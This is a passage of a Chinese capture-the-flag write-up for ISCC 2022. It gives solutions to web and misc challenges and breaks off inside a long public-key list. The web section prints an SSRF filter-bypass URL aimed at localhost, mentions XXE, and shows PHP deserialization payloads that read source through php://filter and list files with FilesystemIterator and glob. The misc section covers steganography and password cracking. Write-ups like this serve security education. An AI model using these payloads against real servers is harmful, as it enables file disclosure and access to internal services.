        if not re.match(&#x27;https?://(?:[-\w.]|(?:%[\da-fA-F]&#123;2&#125;))+&#x27;, url):
            if not re.match(&#x27;https?://@(?:[-\w.]|(?:%[\da-fA-F]&#123;2&#125;))+&#x27;, url):
                raise BaseException(&quot;url format error&quot;)
        if  re.match(&#x27;https?://@(?:[-\w.]|(?:%[\da-fA-F]&#123;2&#125;))+&#x27;, url):
            if judge_ip(hostname):
                return True
            return False, &quot;You not get the right clue!&quot;
        else:
            ip_address = socket.getaddrinfo(hostname,&#x27;http&#x27;)[0][4][0]
            if is_inner_ipaddress(ip_address):
                return False,&quot;inner ip address attack&quot;
            else:
                return False, &quot;You not get the right clue!&quot;
    except BaseException as e:
        return False, str(e)
    except:
        return False, &quot;unknow error&quot;

def ip2long(ip_addr):
    return struct.unpack(&quot;!L&quot;, socket.inet_aton(ip_addr))[0]

def is_inner_ipaddress(ip):
    ip = ip2long(ip)
    print(ip)
    return ip2long(&#x27;127.0.0.0&#x27;) &gt;&gt; 24 == ip &gt;&gt; 24 or ip2long(&#x27;10.0.0.0&#x27;) &gt;&gt; 24 == ip &gt;&gt; 24 or ip2long(&#x27;172.16.0.0&#x27;) &gt;&gt; 20 == ip &gt;&gt; 20 or ip2long(&#x27;192.168.0.0&#x27;) &gt;&gt; 16 == ip &gt;&gt; 16 or ip2long(&#x27;0.0.0.0&#x27;) &gt;&gt; 24 == ip &gt;&gt; 24

def waf1(ip):
    forbidden_list = [ &#x27;.&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;7&#x27;]
    for word in forbidden_list:
        if ip and word:
            if word in ip.lower():
                return True
    return False

def judge_ip(ip):
    if(waf1(ip)):
        return Fasle
    else:
        addr = addr.encode(encoding = &quot;utf-8&quot;)
        ipp = base64.encodestring(addr)
        ipp = ipp.strip().lower().decode()
        if(ip==ipp):
            global control_key
            control_key = 1
            return True
        else:
            return False</code></pre>
<p>代码审计之后访问<code>?url=http://@MTI3LjAuMC4x</code>，得到一个路径和一个cookie，用cookie访问这个路径，查看html</p>
<p>尝试xxe，得到flag</p>
<h3 id="爱国敬业好青年-2">爱国敬业好青年-2</h3>
<p>get<code>/change</code>然后post天安门坐标<code>lati=116°23′E&amp;langti=39°54′N</code></p>
<p>flag=ISCC{w19qs_10llQBX08vE_a0_1qNO}</p>
<h3 id="findme">findme</h3>
<p>查看源码有提示，访问<code>/unser.php</code></p>
<p>post传参</p>
<pre><code class="hljs plaintext">data=O:1:&quot;a&quot;:1:&#123;s:3:&quot;un2&quot;;s:49:&quot;php://filter/read=convert.base64-encode/resource=&quot;;&#125;
PD9waHANCiRhID0gJ2ZsYWflnKjlvZPliY3nm67lvZXkuIvku6XlrZfmr41m5byA5aS055qEdHh05LitLOaXoOazleeIhuegtOWHuuadpSc7</code></pre>
<p>base64解码得到</p>
<pre><code class="hljs plaintext">&lt;?php
$a = &#x27;flag在当前目录下以字母f开头的txt中,无法爆破出来&#x27;;</code></pre>
<p>原生类扫目录</p>
<pre><code class="hljs plaintext">data=O:1:&quot;a&quot;:5:&#123;s:3:&quot;un0&quot;;s:18:&quot;FilesystemIterator&quot;;s:3:&quot;un1&quot;;s:9:&quot;glob://f*&quot;;s:3:&quot;un2&quot;;N;s:3:&quot;un3&quot;;s:11:&quot;unserialize&quot;;s:3:&quot;un4&quot;;N;&#125;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image022.png?x-oss-process=hzy" alt="img"></p>
<p>扫到```Your output: fA07TE_G19nde_OR1Der5r.txt`，访问得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image024.png?x-oss-process=hzy" alt="img"></p>
<h2 id="misc">MISC</h2>
<h3 id="单板小将苏翊鸣">单板小将苏翊鸣</h3>
<p>图片截断了，恢复一下，用010编辑器打开，调整长宽一样，即可恢复图片</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image026.png?x-oss-process=hzy" alt="image-20220501103202079"></p>
<p>得到二维码，扫码得到unicode编码</p>
<pre><code class="hljs plaintext">\u5728\u8fd9\u6b21\u51ac\u5965\u4f1a\u7684\u821e\u53f0\u4e0a\uff0c\u6211\u56fd\u5c0f\u5c06\u82cf\u7fca\u9e23\u65a9\u83b7\u4e00\u91d1\u4e00\u94f6\uff0c\u90a3\u4f60\u77e5\u9053\u6b64\u6b21\u51ac\u5965\u4f1a\u6211\u56fd\u603b\u5171\u83b7\u5f97\u51e0\u679a\u5956\u724c\u5417\uff1f\u53c8\u5206\u522b\u662f\u51e0\u91d1\u51e0\u94f6\u51e0\u94dc\u5462\uff1f</code></pre>
<p>解码得到<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image028.png?x-oss-process=hzy" alt="image-20220501103257825"></p>
<p>查询数据得到解压密码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image030.png?x-oss-process=hzy" alt="image-20220501103317816"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image032.png?x-oss-process=hzy" alt="image-20220501103327929"></p>
<h3 id="藏在星空中的诗-1">藏在星空中的诗-1</h3>
<p>下载附件stars.psd用ps打开，调整图层一不透明度为100%，看到提示</p>
<p>然后打开那个Poem.txt附件，进行排序，得到的就是解压密码，解压那个压缩包之后是表格，对照表格就可以翻译出flag！<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image033.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image034.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image036.jpg?x-oss-process=hzy" alt="img"></p>
<h3 id="藏在星空中的诗-2">藏在星空中的诗-2</h3>
<p>利用在线工具杂项符号转unicoode字符，一一对照好表即可得到</p>
<pre><code class="hljs plaintext">\u0049\u0053\u0043\u0043\u007B\u0062\u0032\u0039\u0021\u0061\u0031\u0028\u0035\u0028\u004A\u0058\u0045\u0070\u0035\u007D</code></pre>
<p>解码后得到</p>
<pre><code class="hljs plaintext">ISCC&#123;b29!a1(5(JXEp5&#125;</code></pre>
<h3 id="降维打击">降维打击</h3>
<p>得到的图片binwalk扫一下看看，发现可以分离一个</p>
<pre><code class="hljs plaintext">binwalk 1.png
dd if=1.png of=3.jpg skip=290500 bs=1</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image038.jpg?x-oss-process=hzy" alt="img"><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image040.jpg?x-oss-process=hzy" alt="img"></p>
<p>再用zeteg分离得到最后的图片，</p>
<pre><code class="hljs plaintext">zsteg -a 1.png</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image042.png?x-oss-process=hzy" alt="img"></p>
<pre><code class="hljs plaintext">zsteg -e b1,r,lsb,yx 1.png -&gt; 3.png 
得到下面这个</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image043.png?x-oss-process=hzy" alt="img"></p>
<p>对照这个得到flag</p>
<p>ISCC{BRDB-CLHD-JLRN}</p>
<h3 id="真相只有一个">真相只有一个</h3>
<p>附件stream开头加50 4B，压缩加密包，然后entity.png的lsb中发现一部分密码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image046.png?x-oss-process=hzy" alt="img"></p>
<p>根据密码制作爆破字典，爆破得到19981111，解压出文件stream.pcapng，流量分析,导出来了一个MP3文件，看一下发现摩斯密码<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image048.png?x-oss-process=hzy" alt="img"></p>
<pre><code class="hljs plaintext">../.../-.-./-.-./--/../.../-.-./解码是I S C C M I S C</code></pre>
<p>用snow.exe解密，得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image050.png?x-oss-process=hzy" alt="img"></p>
<p>ISCC{NSm4-FYDg-F8GI}</p>
<h3 id="2022冬奥会">2022冬奥会</h3>
<p>图片隐写，调整长宽一样，得到html实体编码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image052.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image054.png?x-oss-process=hzy" alt="img"></p>
<p>所以解压密码为灯笼，得到文件flag.jpg，文本查看得到flag</p>
<p>ISCC{beij-dahb-1009}</p>
<h3 id="套中套">套中套</h3>
<p>图片加png文件头，改高得第一部分密码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image056.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image058.png?x-oss-process=hzy" alt="img"></p>
<p>第一段密码wELC0m3_</p>
<p>第二部分，lsb十六进制得到T0_tH3</p>
<p>第三部分图片尾部base64解码得到_ISCC_Zo2z</p>
<p>拼接解压密码为wELC0m3_T0_tH3_ISCC_Zo2z</p>
<p>解压后写个脚本</p>
<pre><code class="hljs plaintext">pubKey = ([24711277289455805071082183921144414032582753663573146469690760085918988346282287830925440309641574970837122386670243171683088155559238888879589465620187779156722578866277244839846688585479196, 8331342674634579788187066694536982163316001309813524371617575401438981756213646261714664444979049172993827679059994325931829820406248619183121063046359168137539946177441258548198381042506623, 37703954458339783215182402838858898442104300800502847019310017886763632326958244079374887169631622937188935937560635479222556228345922043876878912006330280400021181064023528428229021383998773, 25945844358709395918619063088903632951477946913663605727390703353781460648598193122979795324054791877587120519204436132166734684859520681257026335668408205578299876294763586571517340099833251, 46617796408457800169802970506008979749949755415344267530184000035045033930599177801417568531348337113951787988075042216831770929779149620046070943604233228701354336451430773154133861987749736, 42327880776629974121037465864835269480416131528553513676712544339274319407214439082635821738006051597102762475984356192961043234567645210948258511362083821220049393631612535119736190230505079, 22589508873462778330480725281334942556920040122718087013134335609054373022750940493907481894041761451500933602254201267626587716133274536950322527863347103390866567700839589023665853744176166, 49012245620167849002831231356902229194157957266486347984277724206214957520359694455291662818602399440527235773250855790121299923414792428085214736131229263074041971520146812818292757283873972, 50505294007387374356187011832999770420942567192611311152519245434155214975329620482872555711095896003177127425845837803400857344978100153324725001556125905437698323475597576788218126161099748, 34414786369900765425214990265206529100837523490988350328499535711172031795804372249788550156161478651816329269889968144030583108248751740619681030774787866493158241605226717696519397656928761, 5502680605412473949454545822542086565207206020304695803386351464931798180745299614793446981159878475871947667524780863633062822368011961917121718991914199133807397897209943082470470090855239, 9983311781614144459946114456331704088107639087097626233450958945692605583507051189547829807304454244438044518594916557943389434148863316112458522629232887473171898243371185747762751823927947, 48595344374998502475371076864600970857905298177970136849177794628315586457194537343102046554336867973271712237460686037428475343416532023474688245581528647040159995621526996436779938514083176, 30454044156600685547012361559528681837862663453766414789613678283059618403587081733150542831360841363729852732400590613716299519010668812729035958444961137248573111009009383052804127453631029, 29262465032576518257676026674076229615092607424499500332652757724283094828286106061934536663326477468236600903584605319876120398091060431915056800709813964618546529513946627290425530263151785, 58185916880654264057610847400993593764760105195559718130914887205667627960557861087272445125027305651241372181116022684217422418467491370778628349874535569764190295247016711254931516685468763, 50921877714800544475632450382663873906375610195117639257647328721148735828096477553253402935403941670891094883705610281862715168903139696245286876582609952598151293850053015830379511213972743, 38666998055817743159315776056038793353694644727484775020315432289017565065508607748180887543997777917674564556433615026286429388346922382550025360849523093169561551332244159493719912059781747, 2618433286435944949991686140343101299794881415225422420328973994756674163460246534976704295474642810788091225332813529196514409401028062132727458892297854618591225064139465121144529214787359, 15480360531471643031574551152063675696371174191802025724204527356937457630739509894172219260947369397642717350574189853163983085630193129264991869792533078518435439873596650874449441676462668, 58602755253467326614029454783001663335922655777271770463533491628284000847218760267942717989253811387794064666939321561082896879847104642223475122351990487064856802357742730475539596891046692, 45168901123765244366991602858072030788922012241759967936935800489295253946084124106950261327937372194753304110979424196891136037000437320540563517970728380740700665590309964696933950533768952, 53095220066787807649094688415293583022426300394279421659984006465439017324791757144036815940148125279160663621726851858919264911024418507573076327932777107133556897824458372268197339351996050, 7678913185720959224047113283074762966863107257800639648979005678996248105320726214014045806477516899572209637951171447194990910321009220926072297492552801113592628268168399993433574593468502, 37959167582142866022915755986516747311215397821143293846538370998334979797451952481900560704924212988331999767036435777857836921012939210300341751727693548094496560256667712513408836716151074, 42545651517052026953249976733757718747130734598590641325774938685131495452170811885054225996530481032917830345573501191848318085310680273722163386097519639838241428199477437118408178621714090, 9610398279793845223820268953510232729434113393447557999421324995891410814235346759722388316420086296823885985383986638804541574127436150632247129329642747382993402273123828606362086318506545, 19744463887853987506188522688256493351113392479139564742274843195446027734615303020507489136276819812156933775184303608853288797112385962842355566409118478523637667689401510327050155689808963, 4979725803451704682802880425760671801962766594838959346702420024010102650906378175453619080006362724140800969629231682256658227953985378988108718052114334610337888358558164563679074179033934, 14668926421930473155760358387668904656497776501581195022959128573164793788948794457559050645601182951043234342754812273237061242925319104145642020731124457228317607584856514851170615444585585, 65460455002095463508301635207629900022172062603490940057644254400602061418400712297851174032682485882152324214175826165198187099415985297071102776139652984105656201824622553650351799670588945, 2661582533837323983338590062273864301520364357326397920797454944448601911987473465460828367531110033944206117854888428975522476433664338677957019186057110810519534270822863250691457027593044, 12779538505968702708943253328588728814163836032044638747479959239567449619129948012323703553074068191861884355252056415586155135230805815334700683270866487727255569344526622102605049252079197, 61850420362081340308749776345287798149061549939713451598686569595944195998479323930424617090021990637343593584275285296073664530610784418964777622558593896220355098893449991046432197436590815, 55625447034346997655074779792845329848809970234865960498575324169373167970644250275659589291416779330651965190925772334134206502201511955295465581204246482599158834755828739181504688410920090, 14904416005293582561987587212996876960447129876275219980351894584893221270898227205432948845449024712153119872936901283208094580739338490281888647967290861290740157152083915985337434978775904, 22124674754977812834516102854378858529050297803781298797684567461794296685433530240042006429346019294626453914904754425265053037676951997297488874191557784738147055187532517864892027545298315, 18846351874932455622296051092933876028586499884893900742644639816966464207437422678519642330669038978839515093500362729871914197160713556726040506000368526650143519884877363746788961859989132, 22621081149159015032567107719504347553695386923914299415914444288427632487375293596913741307338667796227951565057968083909077066212716991784793985426486838103686411659077034844503176126567789, 12841230998641798116266593207198166735649244492468830162894469944312052458513299045512671494847852308192790180827409763300150170518414022443797443862609024112812965192094711713497604266811617, 10120786799092778094362830067718923842287649317231090770753807189327548106271431002352232816195303298621999022897198457071919114192622014766892543765787280919930815665277147113583396384891114, 41058266319171356374485005618004422265584323710442517247462290624711242578501950124337337997903722834505655714173946372357388396919574021230083882069680153932985831403137524643030385483815800, 52123283472128316976708419634197224071433654547106397460579199293819026350322017651507957133210688435669095244293484184128258366381757433420307988730493665490856056537033979057193480998097763, 61517000967319117566171338221047330324581806374237642231312875833519844079258930787946797082344032110584013134544810839209391074579550421215971726155645956597376068740958698177283737732404827, 16226604739632728375919222595116206334428679353666170449035928991694074630451995163679983802354971368824866433579166025208076428816325748310550403150758192348214760885159116096572525662760101, 66426425703890778075927785969483365267871617675478998065442032710527705903907361434181820023570278730664036493302248694491694073172393569278385741463905464555180447947933938943615052818914183, 2947564769556925319605959230538793663161870226300339519130608498491408776005940198508419841645157582994321121394440225564853852393337606976093752663624776361514402935785722131835098911019403, 29816961646282465976871364104247457927102559081322327721155071385836502816923727268294499430672418815779732053170563814985562872882795933257469163203884659053514988942243178662463188473560295, 2713256216439803749984745895883483863952318758610018250131057573305530374971962615309909225198562619133130194827974264753823687992661761964310791098240593066207346880490695957421285463229107, 9906406334259491146060090196683892489547514234204990430106964503003373179888829787258114325914992191404949463656338508958892876160026312166073788573774288884298018374397303417515521550874150, 54078365793471170140706398796482723868912019038932006275612991202898210325420801183085594405855422507784857365409739547446932223618994314666308619625607987065241502787668992018127962676453483, 20425258677566388400912100957010635842875551938090144574742090980338723925871671882983711166825955421780045924200051850032551916322744543801463085092679158306683258681851505253236948766096106, 33816927193695390021414032401370645373989155036526734515033932429919806358294318423819171837921987915043087186128426177099169163296711457158104374953267011983220034856739201608000795916220084, 22569299706678947064255422911862640664856797506312373134548043143421083056014082136976443234929238934530769251439415905536981559503030264419438070337446106897917782723316841612257532657185840, 60906061769168077951867268304990727455655069877679725265746099100443735874434337363253226597928623916492866603740428700253802610974356684244729994359250955321825806491119397784967620301958162, 61683560492394868273238752217563827909261070437626043044351411081967771518960115227142799898401153293711484529338725744416210848469542659309555786764343106036543284325064978872324776912148336, 50356345233672398555575161883902863039608856563116994194514401421843004097316661791434165508110209485393309699728137647946332880092630169453933776956614977163140290579875896856914867943995366, 57501896087761221000564375757697136810592110930362342648371860401388353885180289214991062858384258865103093846911709029759241601933198727412147772047933274371847299271752509256524812106942250, 12737830521940166510518732614385010900798810502108660291643561432683743269526526847655249815296395869028388694217745935835462182303969283228700066381443353698625850151497471530674890948180993, 52730525322722654713921376964199238474033765608452650504653597312254899581487280672905721240683884524603750141189731290600453246408181070974974158931451326099247674578886059184134025793063868, 5832179034817012236650369797643672435211585032058945177743488719550712649689612351275237337336471079142829651870904093420916141481654235729551073585642892827115226656310606860460600288273655, 62535517575239814174667016568701230794852349969893721013796460627994219128629091861568486936466709698436018363828881128925403900911271449183538857896542035146017269134876848846262990161045234, 62674735529087559354407464038166154727326545572349224291590487213027570707946522267599386119190546292564063533831451739927875419572436144686502560587414111351387107075097956297382503773821605, 50231775288091956263035747878014492829481430248806106216294196040661117899719475382706042952817219810195452729807556678800903374695753170238793075426601197698713622896760402323336733722892457, 66016703624038041271066616941982890762300212198964544029720194993794639127975468101951537864014124274077320069820145004837891079794854747265683579064037448180401326235378152083537351893156223, 2496511842088422406097481800700154417846766004058284282880930570445186794868220752320999581794041120993227584166556524200479566958726138416756301263459458317338037665782200880712313529579524, 52646872632807334416860779432858640539375423228734617646469622709212835705722292347344358678684546207133845232106873627106705739596352075500857832725750858846569694186453572113172665960017652, 39646370252597198496565236102395427848407572580777108324794151271108081384633913864988168655760133387616118209994149416248124886441795495337768092942063220264859382839551951956893925922412134, 66763103206507486137915061914140088421709328069132507765797646700896492046866661406014319733770194930344476690676065063551966262168442474623889019282388949237941611205500498651223291756556086, 30905411916496490647412235950903360870799765548925132745231965669523205205526281555385893805493026281813975250361982091674522643825764888431268279695491360788418367996590337791641197136530928, 36802978383179633045602430175109758511698299036619412838234669610566632506407215718193693455593330403355905832136364706436478063342628406408423151803944813143750407470940914920265832395392001, 60194749394567132016931527223219221042651662116186510587392574598776808636622825172727654207485891941119029919178746441914434963823676756278931330235015964449860965967208494559221500283783040, 23357944960436444392734443389914040506104019640222393290351361988571689390092415558252707718277689369116844128476481036173738922358780605908966379866637105124707173167456714851636013548156739, 14413839339813812319199177166631152261901064711697106835523633830127181361479752535713717720721786075848232234737506977642328333152855488589275858257180278117734620887231016551096332909708647, 63623661091573663419092333077483294513125186988059499936797498945468023816545390708028673599803856000968509633239781485507821105927858868446051126441796952476590488222951683516934788195889963, 47173449672743681102493035677250432660900249391635411883186020982453858441259109812035644083109944719089237624902661190762915664778776463391384519521965033263461250935422119735050908678746124, 23898959454761699951321644342304976175952138299965456468728190477778225149676091931661794316036592189799061007664186888208998219451627854766298682041388770663736583846033670421901199977051411, 56939465507988310684111686507506864403334446260627101558693334520107599582228641195271877482759620303590720056336457467988941316333304541105000907921837480484760039333140714011944997919780636, 57706995827795099322874578236777361637931874707512085328096497850678167529225293754831192001359772520324244402768868076922243301593839657238176101913755401558771628533307197747939433327739357, 59085290173525715274883679181022755626358508525268408133006681403578109907823591218117894685916748218664618156600085708664767942527566222387600125996268497328797162074351708067688299291381563, 40724438992892642016068593942376539944990640030896442125862163295959034803198543039444007102414294992187153524879384818314714965874051460224743541457322201510121319241395627910136543236765269, 9885341381437913020797374114635635157797978318582858745976562761293377897211673386882866982483379152013393705353804659045661846206847102990751829482196178225485544173780798512708262635703137, 42002669955588701846417038940446418629043958073383584745602327041218973407801520482502048385068132376226181082957198557183099735613370398617648713379368136173014433947040712584842132565864809, 25125663990409955127958261559236512499160636662164598599968685249425762965432303284595504718678127834797999144615563347280922038639955929277491432423108198416295109177311644956378899286345151, 52043232111994440152170692751454337323710074655550707818713027507474996117332369275747048022256132519888015600476206150533420139611662074182758887314859751780004242390813999427167134873641489, 21164222904289898583200820230475470937832140078018589456006171221104992588029054270268844445513562633190468248317703743737856297960575866226387062814079680174853254778194574592880561679849321, 15702484615088500815369257827128964783741741236771912266664290661364568194649397469203268785140713546356732952569078861591717555292723304000727339554606906925957856479912345844412702333471365, 10865661251463028269594251527245143343667168817630466243933504255371484048555805440670555614154552108640243768578016581085840046572631906358622366070304538652262695752078134210026057585627918, 2848803623223996890657483211411398077478034985158329263137805600265521902541279192423825859542373133279622786546289736320500383625468714866606412997145169115584444614405591903631064849794838, 43064052364850657153799843048226216904413929532819108475573315194785770905238536117687580944885663773490036328092028409381170318943961988990509994701842228728111323362261400085835856335640347, 63990489176463655630916454653915259090817137481628354169177456232363892666174474468571272039198941019634065551588057378319563646786876536038530167422740816457574069025123874247946420378990978, 20536210103644890440196110659064359071736314904570034779280012207392765984806670293915911314747448059549956521041198910598380251418835027301696553899752401455805786429802889562461551573414835, 48688018205736289829437263548318254081521429916953442860256279463165884722368083232628566478243179223565846730779664230689398112194883125689324606238190271377157029330565187921034701085881412, 24650194985355153552198357593808130629042232388997475934142482180581413670301249765850321594340946693817059933786961129401164409678075708675654670414449498423805470300868883980543108273057191, 38162810917870423497415976195550985283843950680529049352287989443837834607427430908386227981760607012468966076309297964621061969525433491089809297256537209996590034089705613494609971414942483, 16106661412350506424003000819671696402573350097591091267469051557299003724836803927381506823541750712076867906278238744458399104508171739612500841120601902731190037252983961964270369478250135, 60717008689247973968781938908566004496180475295144030364468903344435573439513131353777950673379589823683156482940320368719840535307811939182548209068851585456944960601918613118057278691443843, 57882240905969595582166302623532199536967394873129928940872411621111224766922438484933075842178960723921646374080389455787308593783246149991904442287560715779178925080106931972299586979959953, 12061826536513185869260563532670900297362162236282900029931589855777340428534398586928322428305858525536948501230868891250447684672637900859825530841033648726270215853767105468881462766353647, 40973633971153999167540984043398551153130298337916277287184472612550851536816203105848218587839346694510913994031730070798708511216239645963193961083872326468979562529128797727840639098996831, 25190964043610225574969743147281492438276087947398074376921729347532928885807409753830940977173209614701838033744898224166579262470797747208929440196369133055839958296041729070928084928175397, 23085492771770494644509788889915907342680818144147360119437564563164180950856851904291430723050735715720034055261306070039381175120138832656617084745093517302210431379995787153962673396950446, 1937286375866702470033764597194175817538611841028892680723733464978386442218526149097443771018354033246248121985191264427707436520669150306012229684753815587120632879284603625150768954590725, 57668655807108259615437079174326332892999147524507134641048100122456123589342568481735509156000192574732309053941159985990102188395289859827445761194795514225271513965790503406398879250946020, 35198545820474489569899848069249557859170666517373907458835345371345885779724027455048887305989157801081342610829321715939227090350286603804194859507448972973163229187760810563747030534930096, 2680837408459670214531068863211655690161634979199681308665046291376585209054365216866169377888301551485329985613646031207005581077478836769647505836036847408127664883863678654156379263672346, 12121350007979822308927681064432222683457135471774074095342842220722850481125191571362576595891866927101566205385910418597553030873994196798229835399838952671263905444731701933770406420792121, 4957631799318318039287713537332279724312547937403771431018555605386508208230343165704781613086526046297842296986943480338666436341519107096931707271246707069346795647588239516143515089036499, 35549534355465956154494768947760967550998727688555042974552178207809004983427424921103316720643881947201408505005591186968625102168923059623511112094217632912471836757511264755862703270341997, 52110172792858889942550084958723550101567576170513478250074784092459757017185078051587972765023896269497260859190340089967413958256099639411918402705603770318443799706825579668789545784614306, 21979260423626821018489541432634891685215725203513830851598610785031805881508993329398466374053154095270019921311344755282533940013298535097200167881351776957252298149312359379466488394766334, 18835091260797073562570197337192687096149062471010909287505026739256851663845652546228812299453403369197090762437909361190694731343103307114750836735997823980817474260923309093351161826331851, 31741489402516148911633197695597953081401237503796854927240741326207504993089377049583728444407858426004232071134468398273396605006577855552656764382734524654277518570822875478167442638070901, 16050117042291126277677926822141336442372387354061686268361792054293011835387201560959594636149809378193176734175577918539778477385651844891098832581022035133541637266082160308042031860506989, 16379463477204913330055508893873729174739376880548770933003570470660499885606594386561420463061184588808230491183336279782405733295425571066874025844316939637315915343557140783536280314260190, 23058007636349322493533060888214863711857942288940601048898840019057943804724486110106459414627162992559209093285612285210308835967706195433862579974709778186744020858324991526063814823612287, 19497548104095059626306207887464394273778151478519542948752215627780389285194991470064485692362185896936181237881579479933106410836542916696923953216719052408411804666552233932131319571241763, 17632121136316990934955612215609500766435472016530990904203129722465440826062961881413835332832993132979526774745855028877553216518081174139693119715949034199141619868897050824712146245401588, 1871468487319968372908785904638027514106261889215980360019125483842603309636049187223167809902816215052058167498138766999050264473961232336492552974671621923732211039196537569962142516042355, 62926073061408568815305709546008876991925602654691545685161680583826362674827494368322825291911250082105230802573121612633252347575715105923975409004163278303768506104733416649687428519800752, 65500365105957172579636962313973498672764577312979370212418478100944941884490065883379135454667686291049053276049947674376272785046831902692005131485978786748114625044420777348285369514422896, 39442084005803859743248651321324383868223256723271248941942941219329288135436852908442074189537390961087604110496233569348047766997496498099112587487212179108572289958814078996194165124356571, 28749645518483530181191626607360401710965005503452507585402702473101692981830330921977455897406578416614294892273156950031964192568883035130344623321903046909134347294496256397080491610449783, 59215486516688778254818458983882413560832323676510288447057843140104907059498699532075660384822833477717456618622107255774778427073278729948292838400614933795378669974510804626649421793785832, 38239266349865570890118308779334625251415166366089226198270068826789870291975773540805447014702851667297091330678993691371210077982768540678144457713502249064302773372842360541892860517005928, 10781869801098745922189009636686366741026376123099365671761874522828753309010095045974148776576101040476333187616026046251883938367061041869707334631470632264224458586898378761910988484407522, 44555661165298366621929077029890439918460348802513192503445343800607358749326722940430429144066972517739493904631128687734149376126254489721753894732678101106393312221317100067575618291906876, 66419168629567921834343053143841391733067579594096450584346524244338021419929728437472466918227931064432540911955687063794088879714385096689969461262536176954842293004546425098238106744967544, 53070736350010579101478261026664742633830440810518969293809356268130347073700238364938313884976128806691925379909738186549901426616348254114665071229526846834842533859242206037281011591036289, 22849589939655807391095873987864500357112477263503457235954254349498524812852403116832329056488396748162091885144551074568286219666156511990443897994844330670468980085373463662416383618461467, 7180153334322933025085037204940906254349411631575887280143813253513754261470238096914777722623869792438427552448168780705532068475077894323728119245309544237160824439200585721645590166228420, 11482439014492604534559359091537077661618461698201369584284070129079518511868618757186994516752885928499921289354962724980964253578120911579146839767416018399357811759286441128701879257327409, 13340284240190076852801996978492272593934260994217650388686339010003533927947169352715971012947009755179237313888884967110512743624920673608875707982244817410379882924572291491377414280764504, 16319742011618547561318291933298747389763403441769656204941637523542180357712784347887893270400819572630615616460967210482111595184242129252734239196181783997489879602947364401095934436633840, 25245264191238070106632203778761096089815457066460589468863204041741021444830520840049730272302444433418401417213547796426097383885110343132458212248252538060762962376716059459828802790134118, 4569462007281085626344114509743551095912755602276157412382743883572282836905576946714633114678917034713786819842866758824276969427145784594847589758199664134223615366421110564305852166850756, 16222138934890360286734397616869346119188006403962150947344247922973455683049770004862573585016786313381016665646116773581837505032908893603036889177730855936060000638140423475038765571082437, 27536486649538589838877405800312664596659200874025350885626913317294289481742460638948156829376486168554629725395805255505979788662356489076920425846567848580616902117147138363914943128262868, 19660548836315869980577632085657144304460234727275696562095405800452804952270456690413464091827809646872415608257296548283420857426618514532827157035478615928221980512251880148725239045050572, 2935575951698898266032232265490012685304313227978895061964424259438886204380199162255685722119174179934665079343266063365713050997303256282211640759431768058030092561437103884802603110488026, 15050391309067926582121418817448212157268553037114604384884318666136444999543717730382845372854181435979402248620494574452171618000054901482776133338676983233450693782357102727495150466680028, 15844239224848276396953918986430334242804023674203926124579340310286053504639009733470273287917036368416360132676495915311526874480593278206185756588598105157038681320484244707469227627438636, 60141538952334547131714083168714853189936401560162514615025382204736687748110514588745620090074870079766772161067031978039680771075103440185765155578539288563622621860106047359168162260844534, 45047381276471250981174619803556224475748621940824687575867936161420399614080749846164595911294933112671467207082180454047497664417895485437634278353614168990051094115123403717078196249807462, 63213628474195584088061650017856358607306056083424690128239046359606799520947289828953816760280214157198463731468395297879555219745776202587009614095816156557391728270483415956231481216684127, 47127670452411541823641342868939225861162646075398727586082968366329064652785940730549374132934052760090536352442764305603139737908099767454603464370232665245220297648297947630663865185956858, 27253024246190707296003159139128937539039294335558161543719274117695143050858801199381756277345531356352915974838147614765883773007952056088797078000243444232563774396178048368410683022243600, 58536339286803714222234300164727185302498750556527460206135534519254767876585761649566526890768447339045289107648373430624328699713491542596523037967861994155279091191591924807670592955011170, 57175551329982920356116680928451690094476558030201982262370861043678283259979647494102980609873273499338588744799175384224575598567727581411955085338869075971019893816832990408113023589210692, 1691228204126640565048609153105718816682391106279130954873266081535994803009983222071629038374948751966597853814710700984986351218672473434401054012842971444924818052453217913126056804136634, 18259029928340107051612327899051598631621572170439491860737800320015828939423260018800103341952219448169798069021795590884245237859665920663962296060767687499992086244092229454910838687365523, 34275887125068602666708845519395025657705837555812683307610201684446869655870749876133358373069234049138641432900703496298668500973107970893808842807146663365267834946542177020935189486846663, 59478292605909585646382908673223430222120032595326349358553695541323907659346576450864085948860581917387406847299785962961771900629629458942186507337471890453270925234354360840846884207643024, 18471913267399338563212326631641044656181709708944323035056233436403418430332177915960100112418275886822971100478565428197902731068875657494263701867756491180732018002382889213400874919101437, 28419356783698622386038466787527804412812948444393147867606362906428208603221951008262562715703516257770939548500131732375680515310439957569029091346899056154440147332745840385444672517664872, 4708757448340822715920459148813728646061290570953127713098444568688336699702657954376259939408787111187863066857145859213594085300401029256265676556400548573084764170467918774885607183523407, 